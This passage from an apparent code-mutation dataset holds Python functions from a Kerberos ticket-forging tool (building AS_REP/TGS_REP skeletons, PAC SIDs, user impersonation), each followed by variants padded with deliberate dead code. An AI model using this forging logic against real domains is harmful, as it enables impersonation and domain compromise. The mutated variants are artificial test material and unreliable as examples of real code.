        "original": "def createRequestorInfoPac(self, pacInfos):\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()",
        "mutated": [
            "def createRequestorInfoPac(self, pacInfos):\n    if False:\n        i = 10\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()",
            "def createRequestorInfoPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()",
            "def createRequestorInfoPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()",
            "def createRequestorInfoPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()",
            "def createRequestorInfoPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    pacRequestor = PAC_REQUESTOR()\n    pacRequestor['UserSid'] = SID()\n    pacRequestor['UserSid'].fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()"
        ]
    },
    {
        "func_name": "createBasicTicket",
        "original": "def createBasicTicket(self):\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)",
        "mutated": [
            "def createBasicTicket(self):\n    if False:\n        i = 10\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)",
            "def createBasicTicket(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)",
            "def createBasicTicket(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) < 64):\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. Can't continue\")\n            return (None, None)\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target\n    else:\n        logging.info('Creating basic skeleton ticket and PAC Infos')\n        if self.__domain == self.__server:\n            kdcRep = AS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value\n        else:\n            kdcRep = TGS_REP()\n            kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value\n        kdcRep['pvno'] = 5\n        if self.__options.nthash is None:\n            kdcRep['padata'] = noValue\n            kdcRep['padata'][0] = noValue\n            kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value\n            etype2 = ETYPE_INFO2()\n            etype2[0] = noValue\n            if len(self.__options.aesKey) == 64:\n                etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n            etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)\n            encodedEtype2 = encoder.encode(etype2)\n            kdcRep['padata'][0]['padata-value'] = encodedEtype2\n        kdcRep['crealm'] = self.__domain.upper()\n        kdcRep['cname'] = noValue\n        kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        kdcRep['cname']['name-string'] = noValue\n        kdcRep['cname']['name-string'][0] = self.__target\n        kdcRep['ticket'] = noValue\n        kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value\n        kdcRep['ticket']['realm'] = self.__domain.upper()\n        kdcRep['ticket']['sname'] = noValue\n        kdcRep['ticket']['sname']['name-string'] = noValue\n        kdcRep['ticket']['sname']['name-string'][0] = self.__service\n        if self.__domain == self.__server:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()\n        else:\n            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n            kdcRep['ticket']['sname']['name-string'][1] = self.__server\n        kdcRep['ticket']['enc-part'] = noValue\n        kdcRep['ticket']['enc-part']['kvno'] = 2\n        kdcRep['enc-part'] = noValue\n        if self.__options.nthash is None:\n            if len(self.__options.aesKey) == 64:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value\n            else:\n                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n                kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value\n        else:\n            kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n            kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value\n        kdcRep['enc-part']['kvno'] = 2\n        kdcRep['enc-part']['cipher'] = noValue\n    pacInfos = self.createBasicPac(kdcRep)\n    return (kdcRep, pacInfos)",
            "def createBasicTicket(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.__options.request is True:\n        if self.__domain == self.__server:\n            logging.info('Requesting TGT to target domain to use as basis')\n        else:\n            logging.info('Requesting TGT/TGS to target domain to use as basis')\n        if self.__options.hashes is not None:\n            (lmhash, nthash) = self.__options.hashes.split(':')\n        else:\n            lmhash = ''\n            nthash = ''\n        userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(lmhash), unhexlify(nthash), None, self.__options.dc_ip)\n        (self.__tgt, self.__tgt_cipher, self.__tgt_session_key) = (tgt, cipher, sessionKey)\n        if self.__domain == self.__server:\n            kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        else:\n            serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)\n            (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, self.__domain, None, tgt, cipher, sessionKey)\n            kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])\n        encPartCipher = int(kdcRep['enc-part']['etype'])\n        if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and self.__options.nthash is None:\n            logging.critical(\"rc4_hmac is used in this ticket and you haven't specified the -nthash parameter. Can't continue ( or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey parameter. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and self.__options.aesKey is not None and (len(self.__options.aesKey) > 32):\n            logging.critical(\"aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. Can't continue (or try running again w/o the -request option)\")\n            return (None, None)\n        if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:\n            logging.critical(\"aes256_cts_hmac_sha1_96 is used in this ticket and you haven't specified the -aesKey 